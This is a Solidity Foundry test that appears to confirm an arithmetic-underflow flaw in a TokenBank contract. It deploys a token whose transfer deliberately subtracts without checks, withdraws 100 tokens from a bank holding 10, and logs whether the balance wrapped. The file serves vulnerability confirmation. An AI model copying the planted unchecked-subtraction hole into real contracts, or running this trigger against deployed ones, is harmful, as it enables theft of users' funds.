// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol";

contract VulnerableToken {
    mapping(address => uint256) public balances;
    
    constructor() {
        balances[address(this)] = 10; // initial supply
    }
    
    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        // Underflow vulnerability: subtracting without checks
        unchecked {
            balances[msg.sender] -= amount;
        }
        balances[to] += amount;
        return true;
    }
}

contract TokenBankUnderflowTest is Test {
    TokenBank tokenBank;
    VulnerableToken vulnerableToken;
    address owner = address(this); // test contract acts as owner
    address user = address(0x1);
    
    function setUp() public {
        vulnerableToken = new VulnerableToken();
        tokenBank = new TokenBank();
        
        // Transfer initial tokens to TokenBank
        vulnerableToken.transfer(address(tokenBank), 10);
    }
    
    function test_WithdrawCausesArithmeticUnderflow() public {
        // PRE-Trigger state: Query balances before withdrawal
        console.log("--- BEFORE-Trigger State ---");
        uint256 initialBankBalance = vulnerableToken.balanceOf(address(tokenBank));
        uint256 initialUserBalance = vulnerableToken.balanceOf(user);
        console.log("TokenBank balance (pre-trigger):", initialBankBalance);
        console.log("User balance (pre-trigger):", initialUserBalance);
        assertEq(initialBankBalance, 10, "Incorrect pre-trigger bank balance");
        assertEq(initialUserBalance, 0, "Incorrect pre-trigger user balance");

        console.log("--- Trigger Action: WithdrawToken ---");
        // Over-withdraw tokens to trigger underflow vulnerability
        tokenBank.WithdrawToken(address(vulnerableToken), 100, user);
        
        // POST-Trigger state: Query balances after withdrawal
        console.log("--- AFTER-Trigger State ---");
        uint256 finalBankBalance = vulnerableToken.balanceOf(address(tokenBank));
        uint256 finalUserBalance = vulnerableToken.balanceOf(user);
        console.log("TokenBank balance (post-trigger):", finalBankBalance);
        console.log("User balance (post-trigger):", finalUserBalance);
        
        // Validate underflow result (10 - 100 in uint256)
        uint256 expectedUnderflow = type(uint256).max - 89;
        bool exploitSuccess = (finalBankBalance == expectedUnderflow) && 
                              (finalUserBalance == 100);
        
        // Log vulnerability verdict with clear explanation
        if (exploitSuccess) {
            console.log("Vulnerability Exists: Valid underflow triggered, TokenBank balance underflowed to", finalBankBalance);
        } else {
            console.log("Vulnerability not Exist: Actual balances (bank:%s, user:%s) don't match expected underflow state", finalBankBalance, finalUserBalance);
        }
    }
}